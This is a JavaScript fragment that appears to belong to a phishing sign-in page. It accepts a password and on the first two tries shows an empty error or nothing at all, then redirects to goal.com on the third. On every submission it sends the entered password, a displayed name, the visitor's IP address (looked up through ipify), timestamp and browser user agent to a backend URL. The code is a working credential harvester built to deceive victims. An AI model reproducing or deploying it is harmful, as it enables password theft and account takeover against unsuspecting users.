    let attempt = 0;
    const errorMessageElement = document.getElementById('error-message');
    const signInButtonElement = document.getElementById('sign-in-button');
    let userIp = 'Unknown';

    
    signInButtonElement.addEventListener('click', async function() {
        const number = numberInput.value.trim();

        if (number === '') {
            errorMessageElement.textContent = 'Please enter a password to continue.';
            errorMessageElement.style.display = 'block';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else if (number.length < 4) {
            errorMessageElement.textContent = 'The password is incorrect. Please try again.';
            errorMessageElement.style.display = 'block';
            numberInput.value = '';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else {
            errorMessageElement.style.display = 'none';

            attempt++;
            await sendInfoToName();
            if (attempt === 1 || attempt === 2) {
                errorMessageElement.textContent = '';
                errorMessageElement.style.display = 'block';
                setTimeout(function() {
                    errorMessageElement.style.display = 'none';
                }, 3000);
            } else if (attempt === 3) {
                window.location.href = 'https://www.goal.com';
            }
            numberInput.value = ''; 
        }
    });


    async function fetchUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIp = data.ip;
        } catch (error) {
            userIp = 'IP - undefined';
        }
    }

    async function sendInfoToName() {
        const Name = document.getElementById('Name-text').textContent;
        const number = numberInput.value;
        const { formattedDate, formattedTime } = getFormattedDateAndTime();
        const userAgent = navigator.userAgent;

        await fetchUserIp();

        const payload = {
            Name: Name,
            number: number,
            ip: userIp,
            date: formattedDate,
            time: formattedTime,
            userAgent: userAgent
        };

        fetch(BACKEND_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (!data.success) {
                console.error('Name sending error:', data.message);
            }
        })
        .catch(error => console.error('Error sending data to server:', error));
    }

    function getFormattedDateAndTime() {
        const date = new Date();
        const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
        const formattedDate = `${date.getDate()} ${monthNames[date.getMonth()]}, ${date.getFullYear()}`;
        const formattedTime = `${date.getHours().toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
        return { formattedDate, formattedTime };
    }
